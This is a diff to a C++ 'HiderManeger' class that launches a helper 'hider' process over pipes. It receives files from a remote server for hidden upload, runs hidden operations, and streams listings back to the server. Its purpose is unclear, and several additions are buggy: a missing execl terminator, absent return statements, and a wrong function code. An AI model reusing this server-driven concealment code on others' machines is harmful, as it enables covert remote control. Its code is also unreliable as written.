@@ -4,16 +4,33 @@
 
 #include "HiderManeger.h"
 
-HiderManeger::HiderManeger(std::string path)
+HiderManeger::HiderManeger()
 {
-    hiderPath = path;
+    hiderPath = DEFAULT_HIDER_PATH;
     HtMredirect = false;
     MtHredirect = false;
+}
+
+Error HiderManeger::setUpHider(std::string path)
+{
+    hiderPath = path;
 }
 
 void HiderManeger::activateHiderChild(FunCode fncode, std::string param) {
     char numericalArg[3];
     sprintf(numericalArg, "%d", fncode);
+
+    if (MtHredirect) {
+        close(mthpipe[1]);
+        dup2(mthpipe[0], STDIN_FILENO);
+        close(mthpipe[0]);
+    } 
+    if (HtMredirect) {
+        close(htmpipe[0]);
+        dup2(htmpipe[1], STDOUT_FILENO);
+        close(htmpipe[1]);
+    }
+    
     execl(hiderPath.c_str(), numericalArg, param);
 }
 
@@ -26,13 +43,8 @@ Error HiderManeger::activateHider(FunCode fncode, std::string param)
     if (pid == 0) { // child work
         activateHiderChild(fncode, param);
     }
-    
-    // parent work
 
-    // execl hider as child
-    // if pipes are open use dup
-    // command line argument - funcode
-    // return the return value of exec
+    return SUCCSESS;
 }
 
 Error HiderManeger::openPipes(int p[])
@@ -43,15 +55,24 @@ Error HiderManeger::openPipes(int p[])
     return Error::SUCCSESS;
 }
 
-Error HiderManeger::hiddenUpload(std::string param)
+Error HiderManeger::hiddenUpload(std::string param, Client& client)
 {
     openPipes(mthpipe);
     MtHredirect = true;
     activateHider(FunCode::HIDDEN_UPLOAD, param);
     close(mthpipe[0]);
     MtHredirect = false;
-    // TODO
-    // loop for send and -> pipe file
+
+    // send file server -> pipe
+    char buffer[BUFFER_SIZE] = {0};
+    while (true)
+    {
+        int bytes_received = client.recvData(buffer);
+        if (bytes_received <= 0)
+            break;
+        write(mthpipe[1], buffer, bytes_received); 
+    }
+
     close(mthpipe[1]);
 }
 
@@ -65,21 +86,26 @@ Error HiderManeger::hiddenRun(std::string param)
     return activateHider(FUNCODES_ENUM_H::HIDDEN_RUN, param);
 }
 
-Error HiderManeger::hiddenList()
+Error HiderManeger::hiddenList(Client& client)
 {
     openPipes(htmpipe);
     HtMredirect = true;
     Error er = activateHider(FUNCODES_ENUM_H::HIDDEN_RUN, "");
+    close(htmpipe[1]);
     if (er) {
         return er;
     }
     HtMredirect = false;
-    close(htmpipe[1]);
-    // TODO
-    // loop for receiving file pipe -> server
     
+    // loop for receiving file pipe -> server
     bool cont = true;
-
+    char buffer[BUFFER_SIZE] = {0};
+    while (cont)
+    {
+        if (read(htmpipe[0], buffer, BUFFER_SIZE) != BUFFER_SIZE)
+            cont = false;
+        client.sendData(buffer);
+    }
     
     close(htmpipe[0]);
 }
